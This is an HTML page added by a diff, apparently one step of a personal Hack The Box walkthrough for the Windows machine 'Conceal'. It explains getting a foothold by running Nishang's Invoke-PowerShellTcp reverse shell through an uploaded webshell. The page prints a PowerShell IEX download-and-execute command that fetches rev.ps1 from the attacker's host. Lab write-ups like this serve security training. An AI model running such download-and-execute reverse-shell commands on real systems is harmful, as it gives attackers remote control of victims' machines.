@@ -1,0 +1,70 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>nishang reverse shell</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
+<p><a href="HacktheBox--Windows_Boxes--conceal.html">conceal</a></p>
+
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--nmap_Automator.html">nmap Automator</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel.html">setting up vpn tunnel</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--snmpwalk.html">snmpwalk</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--snmpwalk--crackstation.html">crackstation</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--snmp-check.html">snmp-check</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--ike-scan.html">ike-scan</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--strongswan.html">strongswan</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--strongswan--vi_-etc-ipsec.secrets.html">vi /etc/ipsec.secrets</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--strongswan--vi_ipsec.conf.html">vi ipsec.conf</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--strongswan--start_tunnel.html">start tunnel</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--strongswan--start_tunnel--troubleshooting_with_netgate.html">troubleshooting with netgate</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--setting_up_vpn_tunnel--tunnel_success_verification.html">tunnel success verification</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--potential_tunnel_issue_fixes.html">potential tunnel issue fixes</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--http.html">http</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--gobuster.html">gobuster</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--ftp.html">ftp</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--ftp--test.aspx.html">test.aspx</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--ftp--test.asp.html">test.asp</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--ftp--test.asp--revshell.asp.html">revshell.asp</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--tennc_webshell_github.html">tennc webshell github</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--tennc_webshell_github--picking_webshell_payload.html">picking webshell payload</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--tennc_webshell_github--nishang_reverse_shell.html">nishang reverse shell</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--initial_foothold--tennc_webshell_github--reverse_shell.html">reverse shell</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--privesc.html">privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--privesc--windows-exploit_suggester.html">windows-exploit suggester</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--privesc--windows-exploit_suggester--systeminfo.html">systeminfo</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--privesc--whoami_-priv.html">whoami /priv</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--privesc--juicy_potato.html">juicy potato</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--privesc--juicy_potato--rerun_with_correct_CLSID.html">rerun with correct CLSID</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--privesc--juicy_potato--rev_shell_to_nt_auth.html">rev shell to nt auth</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--conceal--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Windows_Boxes--conceal--lessons_learned.html">lessons learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>nishang reverse shell</u></b></h1><span style="color:#24ff00;">since the box's </span><span style="color:#ffa500;">ftp server</span><span style="color:#24ff00;"> clears itself everyfew minutes, its best to </span><span style="color:#ffff00;">upload</span><span style="color:#24ff00;"> a</span><span style="color:#ffa500;"> reverse shell</span><span style="color:#24ff00;"> in our </span><span style="color:#ffa500;">webshell</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">run</span><span style="color:#24ff00;"> it </span><span style="color:#ffff00;">before it gets cleared</span><span style="color:#24ff00;"> in order to get our </span><span style="color:#ffff00;">foothold</span><span style="color:#24ff00;"><br /><br />first lets move nishang's </span><span style="color:#ffa500;">Invoke-PowershellTcp </span><span style="color:#24ff00;">over to our working directory</span><br /><img src="images/1406-1.png" alt="images/1406-1.png" /><br /><br /><span style="color:#24ff00;">edit the file and add the I</span><span style="color:#ffa500;">nvoke-PowerShellTcp</span><span style="color:#24ff00;"> command at the end of the script</span><br /><img src="images/1406-2.png" alt="images/1406-2.png" /><br /><br /><span style="color:#24ff00;">rename the </span><span style="color:#ffa500;">reverse shell script</span><span style="color:#24ff00;"> to something simple</span><br /><img src="images/1406-3.png" alt="images/1406-3.png" /><br /><br /><span style="color:#24ff00;">spin up the webserver</span><br /><img src="images/1406-4.png" alt="images/1406-4.png" /><br /><br /><span style="color:#24ff00;">now the hard and timely part of uploading and executing our nishang script before the webserver clears our webshell</span><br /><span style="color:#ffa500;">powershell "IEX(new-object net.webclient).downloadstring('http://10.10.14.62:5555/rev.ps1')</span><br /><img src="images/1406-5.png" alt="images/1406-5.png" /><br /><br /><img src="images/1406-6.png" alt="images/1406-6.png" /></div></div>
+</body></html>
